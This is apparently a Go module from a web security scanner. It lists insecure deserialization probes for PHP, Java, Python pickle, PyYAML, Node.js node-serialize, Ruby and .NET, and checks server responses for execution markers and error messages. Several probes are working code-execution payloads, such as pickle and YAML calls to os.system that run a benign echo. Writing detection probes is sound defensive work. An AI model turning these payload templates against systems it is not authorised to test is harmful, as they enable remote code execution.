package deserialization

import (
	"strings"
)

// DeserProbe defines an insecure deserialization test probe for Java, PHP, Python, Node, Ruby, and .NET.
type DeserProbe struct {
	Language string
	Name     string
	Payload  string
	Signal   string
	Severity string
}

// Probes returns standard deserialization diagnostic probes.
func Probes() []DeserProbe {
	return []DeserProbe{
		// --- PHP Object Injection ---
		{
			Language: "php",
			Name:     "php_stdclass_serialized",
			Payload:  `O:8:"stdClass":1:{s:4:"akca";s:4:"test";}`,
			Signal:   "php_deser_marker",
			Severity: "high",
		},
		{
			Language: "php",
			Name:     "php_array_object_injection",
			Payload:  `a:1:{i:0;O:10:"AkcaMarker":0:{}}`,
			Signal:   "php_deser_marker",
			Severity: "high",
		},

		// --- Java Serialized Objects ---
		{
			Language: "java",
			Name:     "java_serialized_base64",
			// Base64 of Java magic bytes 0xAC 0xED 0x00 0x05 (Serialized Object Stream header)
			Payload:  "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sBFlme0AwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAAeA==",
			Signal:   "java_serialized_stream",
			Severity: "critical",
		},

		// --- Python Pickle ---
		{
			Language: "python",
			Name:     "python_pickle_raw",
			Payload:  "cos\nsystem\n(S'echo akca_deser_check'\ntR.",
			Signal:   "python_pickle_exec",
			Severity: "critical",
		},
		{
			Language: "python",
			Name:     "python_pickle_base64",
			Payload:  "Y29zCnN5c3RlbQooUydlY2hvIGFrY2FfZGVzZXJfY2hlY2snCnRSLg==",
			Signal:   "python_pickle_exec",
			Severity: "critical",
		},

		// --- Node.js node-serialize RCE ---
		{
			Language: "nodejs",
			Name:     "nodejs_serialize_nd_func",
			Payload:  `{"rce":"_$$ND_FUNC$$_function(){return 'akca_nd_func_marker';}()"}`,
			Signal:   "nodejs_serialize_nd_func",
			Severity: "critical",
		},

		// --- YAML Deserialization ---
		{
			Language: "yaml",
			Name:     "pyyaml_object_apply",
			Payload:  `!!python/object/apply:os.system ["echo akca"]`,
			Signal:   "pyyaml_deser",
			Severity: "critical",
		},
		{
			Language: "yaml",
			Name:     "ruby_yaml_gem_requirement",
			Payload:  `--- !ruby/object:Gem::Requirement`,
			Signal:   "ruby_yaml_deser",
			Severity: "high",
		},

		// --- .NET JSON TypeNameHandling ---
		{
			Language: "dotnet",
			Name:     "dotnet_type_name_handling",
			Payload:  `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start"}`,
			Signal:   "dotnet_type_name_handling",
			Severity: "critical",
		},
	}
}

// AnalyzeResponse checks if the server response indicates deserialization activity or error disclosure.
func AnalyzeResponse(baselineBody string, baselineStatus int, probeBody string, probeStatus int, probe DeserProbe) (bool, string) {
	probeLower := strings.ToLower(probeBody)

	// Direct execution markers
	if strings.Contains(probeLower, "akca_nd_func_marker") || strings.Contains(probeLower, "akca_deser_check") {
		return true, probe.Signal
	}

	// Deserialization error disclosures
	deserErrors := []string{
		"unserialize(): error at offset",
		"cannot deserialize instance of",
		"type name handling",
		"invalidsignatureexception",
		"pickle.unpicklingerror",
		"java.io.invalidclassexception",
		"java.io.streamcorruptedexception",
		"deserialization of untrusted data",
		"cannot resolve type id",
		"jsonmappingexception",
		"yaml.constructorerror",
	}

	for _, errStr := range deserErrors {
		if strings.Contains(probeLower, errStr) && !strings.Contains(strings.ToLower(baselineBody), errStr) {
			return true, "deserialization_error_disclosure"
		}
	}

	return false, ""
}
